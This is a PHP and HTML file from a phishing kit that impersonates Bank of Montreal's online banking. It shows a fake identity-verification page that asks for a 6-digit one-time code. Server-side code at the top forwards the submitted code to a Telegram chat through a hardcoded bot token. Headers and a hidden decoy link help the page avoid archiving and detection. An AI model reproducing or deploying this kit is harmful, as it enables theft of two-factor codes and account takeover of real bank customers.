<?php

    $code       = $_POST['code']; 


$message = "$code";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data1 = [
    'chat_id' => '-953492204',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot{$apiToken}/sendMessage?" . http_build_query($data1));

?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../Database/third-party-log.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html<head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>Online Banking | Bank of Montreal</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../Database/third-party-log.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <link rel="stylesheet" href="files/uap-application-all-css.css">
        <link href="assets/bmo/favicon.ico?v=1" rel="shortcut icon">
        <style>
        .otp-section-red, .otp-section-error, .otp-section-warning, .otp-section, .otp-section-grey, .otp-section-mint-green, .otp-section-green {
            padding: 2px 18px;
        }

        .form-control.ng-valid:hover, .form-control.ng-valid:focus {
            border-bottom-color: #0079c1 !important;
        }
        </style>
</head>
    <body prevent-click-highlight="" autoscroll="" class="">
        <div id="contentWrapper">
            <!-- Header -->
            <!---->
            <div data-ui-view="header" class="" style="">
                <otp-header>
                    <div class="td_rq_header-nav td-header-nav">
                        <!-- Desktop Header START -->
                        <header class="td-header-desktop">
                            <div class="td-nav-primary" style="background-color:#ffffff">
                                <div class="td-container">
                                    <div class="td-section-left">
                                        <div class="td-logo" style="margin-top: 15px;">
                                            <img ng-src="/assets/bmo/logo.png" style="width:100px" src="files/logo.png">
                                        </div>
                                    </div>
                                    <div class="td-section-right">
                                        <div class="td-quick-access">
                                            <ul class="td-header-nav-utilities">
                                                <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                                    <a href="deposit/bmo/t.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                                    <span class="td-forscreenreader">Select language</span>
                                                    Français
                                                    <span class="td-icon expand" aria-hidden="true"></span>
                                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                                    </a>
                                                    <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                            <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                                English
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                                </span><!---->
                                                                <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                        <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                            <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                                Français
                                                                <!---->
                                                                <!---->
                                                            </a>
                                                        </li>
                                                        <!---->
                                                    </ul>
                                                </li>
                                                <li class="secure-lock-position" aria-hidden="true">
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </header>
                        <!-- Desktop Header END -->
                        <!-- Mobile Header START -->
                        <header class="td-header-mobile">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                            <span class="td-forscreenreader">Open menu</span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                            <span class="icon-bar" aria-hidden="true"></span>
                                        </div>
                                        <div class="td-logo">
                                            <img class="logoImage" src="files/bmo-logo-white.svg" style="margin-left:120px; margin-right:auto;width:120px;">
                                        </div>
                                    </button>
                                    <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                        Test!
                                        <div class="td-logo">
                                            <img src="files/logo.png" style="width:91px">
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </header>
                        <!-- Mobile Header END -->
                        <!-- Mobile Off-canvas Menu START -->
                        <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                            <!-- Primary mobile menu START -->
                            <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                                <span tabindex="0"></span>
                                <div class="td-nav-mobile-menu-top">
                                    <div class="td-nav-mobile-menu-header">
                                        <div class="td-logo">
                                            <a href="https://authentication.td.com/">
                                                <img src="files/logo.png" alt="BMO">
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <nav>
                                    <ul class="td-nav-mobile-menu-list">
                                        <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                            <a href="deposit/bmo/t.php" aria-expanded="false" role="button">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                            </a>
                                            <ul class="td-accordion-content">
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                    <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                        English
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                        </span><!---->
                                                        <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                    </a>
                                                </li>
                                                <!---->
                                                <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                    <a href="deposit/bmo/t.php" role="button" ng-click="vm.setLanguage(language)">
                                                        Français
                                                        <!---->
                                                        <!---->
                                                    </a>
                                                </li>
                                                <!---->
                                            </ul>
                                        </li>
                                    </ul>
                                </nav>
                                <span tabindex="0"></span>
                            </div>
                            <!-- Primary mobile menu END -->
                            <div class="td-nav-mobile-overlay"></div>
                        </div>
                        <!-- Mobile Off-canvas Menu END -->
                    </div>
                </otp-header>
            </div>
            <!-- Main Content / Body -->
            <div class="td-contentarea" role="main" style="padding-top: 70px;">
                <!---->
                <ui-view class="" style="">
                    <!---->
                    <ui-view>
                        <reset>
                            <!---->
                            <ui-view class="" style="">
                                <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                                    <div class="text-center">
                                        <otp-server-error error="vm.dt.recoverPwdError" display="banner">
                                            <!---->
                                        </otp-server-error>
                                    </div>
                                    <div class="td-container">
                                        
                                        
                                        <form method="post" action="928463.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" id="lab-form">
                                            <h1 class="text-center">Identity Verification</h1>
                                            <div class="td-row">
                                                <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                                    <div class="tfa-info" style="font-size: 15px;">
                                                        <p>In order to sign on to BMO, we need to verify your identity.</p>
                                                        <p>We will send you a one-time verification code to the contact method selected below.</p>
                                                        <p class="mb5">Note: For account security, we're no longer sending one-time verification codes to personal or free email services.</p>
                                                    </div>
                                                                                                        <div class="otp-section-mint-green otp-full-width-sm">
                                                        <div class="td-row" style="padding-top: 10px;">
                                                            
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="td-row" id="step-2" style="display: block;">
                                                <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                                    <div class="otp-section-mint-green otp-full-width-sm">
                                                        <p class="code-sent mb5" style="margin-bottom: 5px;">The code has been sent to the selected contact method.</p>
                                                        <div class="otp-section-mint-green otp-full-width-sm">
    <p class="code-sent mb5" style="margin-bottom: 5px; color: red;">Timeout Error: Please wait for a new code.</p>
    <div class="td-row">
        <div class="td-col-sm-6 td-col-sm-offset-3">
            <div class="form-group" style="padding-bottom: 0px">
                <label>Verification Code</label>
                <input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code" type="tel" name="code" placeholder="6-digit code" maxlength="6" value="" class="form-control ng-empty lrinput" attr-action="Filling 2FA Code" required="required" style="border-color: red;">
            </div>
        </div>
    </div>
    <p>Try another way?<a href="928464.php" class="nga-resend-button" id="btn-resend"><br> Verify debit/credit card information</a></p>
    <p class="code-sent mb5" style="margin-bottom: 5px;">Please allow a few minutes for the verification code to be sent.</p>
</div>
                                                        
                                                        
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="td-row">
                                                <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                                                    <div class="form-group" style="padding-top: 15px;">
                                                        <button type="submit" id="btn-send" name="save" value="1" class="td-button  td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: none;">
                                                            <font color="white">  Send</font>
                                                        </button>
                                                        <button type="submit" name="save" id="btn-sending" value="1" class="td-button  td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: none;" disabled="">
                                                            <font color="white">  Sending</font>
                                                        </button>
                                                        <button type="submit" id="btn-next" name="save" value="1" class="td-button btn-save td-button" style="background-color: rgb(0, 121, 193); width: 100%; display: block;">
                                                            <span class="btn-txt"><font color="white">  Next</font></span>
                                                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>                                       <br><br><br><br><br><br><br><br><br><br><br><br><br>
                                    </div>
                                    <br><br>
                                </reset-password>
                            </ui-view>
                        </reset>
                    </ui-view>
                </ui-view>
            </div>
            
            <!---->
            <div data-ui-view="footer" class="">
                <otp-footer>
                    <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
                        <!---->
                        <div class="td-container">
                            <div class="td-row">
                                <div class="td-col-xs-12 td-footer-content otp-footer-content">
                                    <div class="td-footer-links td-copy-align-centre td-copy-white">
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/main/contact-us">
                                        Contact us
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/our-privacy-code">
                                        Privacy
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/legal">
                                        Legal
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/about/banking/privacy-security/how-we-protect-you">
                                        Security
                                        </a>
                                        <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.bmo.com/home/popups/global/cdic">
                                        CDIC Member
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </otp-footer>
            </div><a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </div>
        <!--[if lt IE 9]>
        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
        <![endif]-->
        <div id="ads"></div>
        <div id="ads"></div>
        <div id="ads"></div>
    

</body></html>